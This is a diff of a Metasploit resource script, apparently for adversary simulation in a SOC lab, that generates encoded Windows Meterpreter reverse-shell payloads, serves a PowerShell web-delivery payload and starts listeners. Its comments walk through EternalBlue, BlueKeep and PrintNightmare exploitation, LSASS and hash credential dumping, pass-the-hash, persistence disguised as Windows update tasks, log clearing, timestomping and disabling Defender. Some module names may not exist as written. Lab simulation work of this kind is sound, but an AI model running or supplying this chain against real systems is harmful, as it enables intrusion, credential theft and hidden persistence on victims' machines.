@@ -1,22 +1,55 @@
 # Metasploit Resource Script for C2 Simulation
 # Usage: msfconsole -r metasploit_c2.rc
-# Target: Windows Server 2022 (x86_64) in Hybrid Cloud SOC Lab
+# Target: Windows Server 2022 (x86_64) in Hybrid SOC Lab
+#
+# REQUIRED: Set these variables before running:
+#   setg RHOSTS <TARGET_IP>
+#   setg LHOST <ATTACKER_IP>
+#   setg LPORT 4444
+#   setg SRVPORT 8080
+#   setg URIPATH /
+#   setg RC4PASSWORD <secure_random_password>
+#
+# Example:
+#   msfconsole -r metasploit_c2.rc
+#   msf6 > setg RHOSTS 10.0.1.10
+#   msf6 > setg LHOST 10.0.2.5
+#   msf6 > setg RC4PASSWORD $(openssl rand -hex 16)
 
 # ============================================================
-# GLOBAL SETTINGS
+# GLOBAL SETTINGS (OVERRIDE THESE BEFORE RUNNING)
 # ============================================================
-setg RHOSTS 10.0.1.10          # Target Windows IP (adjust to your environment)
-setg LHOST 10.0.2.5            # Attacker VM IP (VM2 or dedicated attacker)
-setg LPORT 4444                # Default reverse shell port
-setg SRVPORT 8080              # HTTP server port for payload delivery
-setg URIPATH /                 # URI path for payload
-setg ExitOnSession false       # Keep listener running after session
-setg EnableStageEncoding true  # Encode stage to evade basic detection
-setg StageEncoder x64/xor      # Encoder for x64 payloads
+# Target Windows IP (adjust to your environment)
+setg RHOSTS 10.0.1.10
+
+# Attacker VM IP (VM2 or dedicated attacker)
+setg LHOST 10.0.2.5
+
+# Default reverse shell port
+setg LPORT 4444
+
+# HTTP server port for payload delivery
+setg SRVPORT 8080
+
+# URI path for payload
+setg URIPATH /
+
+# Keep listener running after session
+setg ExitOnSession false
+
+# Encode stage to evade basic detection
+setg EnableStageEncoding true
+
+# Encoder for x64 payloads
+setg StageEncoder x64/xor
+
+# RC4 password for encrypted payloads (CHANGE THIS - generate with: openssl rand -hex 16)
+setg RC4PASSWORD labpassword123
 
 # ============================================================
 # PAYLOAD GENERATION - Windows x64 Meterpreter Reverse TCP
 # ============================================================
+
 # Generate staged payload (smaller initial stager)
 use payload/windows/x64/meterpreter/reverse_tcp
 set EXITFUNC thread
@@ -26,7 +59,7 @@ generate -f exe -o /tmp/meterpreter_reverse_tcp.exe
 
 # Generate staged payload with RC4 encryption
 use payload/windows/x64/meterpreter_reverse_tcp_rc4
-set RC4PASSWORD labpassword123
+set RC4PASSWORD ${RC4PASSWORD}
 generate -f exe -o /tmp/meterpreter_reverse_tcp_rc4.exe
 
 # Generate stageless payload (larger but no stage download)
@@ -55,7 +88,7 @@ use exploit/multi/script/web_delivery
 set target 2  # PowerShell
 set payload windows/x64/meterpreter/reverse_tcp
 set SRVHOST 0.0.0.0
-set SRVPORT 8080
+set SRVPORT ${SRVPORT}
 set URIPATH /payload
 run -j
 
@@ -67,7 +100,7 @@ run -j
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
-set LPORT 4444
+set LPORT ${LPORT}
 set ExitOnSession false
 run -j
 
@@ -76,7 +109,7 @@ use exploit/multi/handler
 set payload windows/x64/meterpreter_reverse_tcp_rc4
 set LHOST 0.0.0.0
 set LPORT 4445
-set RC4PASSWORD labpassword123
+set RC4PASSWORD ${RC4PASSWORD}
 set ExitOnSession false
 run -j
 
@@ -84,7 +117,7 @@ run -j
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_http
 set LHOST 0.0.0.0
-set LPORT 8080
+set LPORT ${SRVPORT}
 set LURI /admin/get.php
 set ExitOnSession false
 run -j
@@ -101,51 +134,54 @@ run -j
 # ============================================================
 # EXPLOITATION MODULES (for initial access)
 # ============================================================
-
+# UNCOMMENT AND CONFIGURE AS NEEDED FOR YOUR LAB
+# 
 # EternalBlue (MS17-010) - SMBv1 Exploit
 # use exploit/windows/smb/ms17_010_eternalblue
 # set payload windows/x64/meterpreter/reverse_tcp
+# set RHOSTS ${RHOSTS}
 # run
-
+#
 # BlueKeep (CVE-2019-0708) - RDP Exploit
 # use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 # set payload windows/x64/meterpreter/reverse_tcp
+# set RHOSTS ${RHOSTS}
 # run
-
+#
 # PrintNightmare (CVE-2021-34527) - Print Spooler
 # use exploit/windows/smb/printnightmare
 # set payload windows/x64/meterpreter/reverse_tcp
+# set RHOSTS ${RHOSTS}
 # run
 
 # ============================================================
 # POST-EXPLOITATION - CREDENTIAL ACCESS (T1003.001)
 # ============================================================
-
 # Once session established, run these post modules:
-
+#
 # 1. Dump LSASS via built-in Mimikatz (Kiwi)
 # meterpreter > load kiwi
 # meterpreter > creds_all
-
+#
 # 2. Hashdump (SAM/NTDS)
 # meterpreter > hashdump
-
+#
 # 3. LSASS Memory Dump via procdump (if available)
 # meterpreter > execute -f c:\windows\temp\procdump.exe -a "-accepteula -ma lsass.exe c:\windows\temp\lsass.dmp"
-
+#
 # 4. WMI Persistence
 # meterpreter > run post/windows/manage/wmi_persistence EXECUTABLE_PATH="C:\Windows\Temp\payload.exe"
-
+#
 # 5. Scheduled Task Persistence
 # meterpreter > run post/windows/manage/persistence_exe REXEPATH="C:\Windows\Temp\payload.exe"
-
+#
 # 6. Registry Run Key Persistence
 # meterpreter > run post/windows/manage/persistence_registry REGISTRY_KEY="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" REGISTRY_VALUE="WindowsUpdate" EXECUTABLE_PATH="C:\Windows\Temp\payload.exe"
 
 # ============================================================
 # POST-EXPLOITATION - LATERAL MOVEMENT
 # ============================================================
-
+#
 # Pass the Hash
 # meterpreter > run post/windows/gather/hashdump
 # use exploit/windows/smb/psexec
@@ -153,42 +189,42 @@ run -j
 # set SMBPass <NTLM_HASH>
 # set payload windows/x64/meterpreter/reverse_tcp
 # run
-
+#
 # PsExec with Service Creation
 # meterpreter > run post/windows/manage/psexec_command COMMAND="cmd.exe /c whoami"
-
+#
 # WMI Lateral Movement
 # meterpreter > run post/windows/gather/wmi_persistence
 
 # ============================================================
 # POST-EXPLOITATION - DEFENSE EVASION
 # ============================================================
-
+#
 # Clear Event Logs
 # meterpreter > clearev
-
+#
 # Timestomp
 # meterpreter > timestomp "C:\Windows\Temp\payload.exe" -v "C:\Windows\System32\kernel32.dll"
-
+#
 # Disable Windows Defender
 # meterpreter > run post/windows/manage/disable_defender
-
+#
 # Unhook/ETW Bypass
 # meterpreter > run post/windows/manage/unhook
 
 # ============================================================
 # NETWORK RECONNAISSANCE
 # ============================================================
-
+#
 # ARP Scan
 # meterpreter > run post/windows/gather/arp_scanner RHOSTS=10.0.1.0/24
-
+#
 # Port Scan
 # meterpreter > run post/windows/gather/portscan RHOSTS=10.0.1.0/24 PORTS=445,3389,135,139,5985,5986
-
+#
 # Network Share Enumeration
 # meterpreter > run post/windows/gather/enum_shares
-
+#
 # Domain Enumeration (if domain joined)
 # meterpreter > run post/windows/gather/enum_domain
 # meterpreter > run post/windows/gather/enum_domain_users
@@ -197,28 +233,27 @@ run -j
 # ============================================================
 # PERSISTENCE - MULTIPLE TECHNIQUES
 # ============================================================
-
+#
 # 1. Registry Run Key
 # meterpreter > run post/windows/manage/persistence_registry REGISTRY_KEY="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" REGISTRY_VALUE="WindowsDefenderUpdate" EXECUTABLE_PATH="C:\Windows\Temp\update.exe"
-
+#
 # 2. Scheduled Task (At startup)
 # meterpreter > run post/windows/manage/persistence_sched_task TASK_NAME="WindowsUpdate" EXECUTABLE_PATH="C:\Windows\Temp\update.exe" TRIGGER=STARTUP
-
+#
 # 3. WMI Event Subscription
 # meterpreter > run post/windows/manage/wmi_persistence EXECUTABLE_PATH="C:\Windows\Temp\update.exe"
-
+#
 # 4. Service Installation
 # meterpreter > run post/windows/manage/persistence_service SERVICE_NAME="WindowsDefenderUpdater" EXECUTABLE_PATH="C:\Windows\Temp\update.exe"
-
+#
 # 5. DLL Search Order Hijacking
 # meterpreter > run post/windows/manage/dll_hijack DLL_NAME="version.dll" EXECUTABLE_PATH="C:\Windows\Temp\malicious.dll"
 
 # ============================================================
 # CLEANUP
 # ============================================================
-
 # Kill all jobs
 # jobs -K
-
+#
 # Exit
 # exit -y
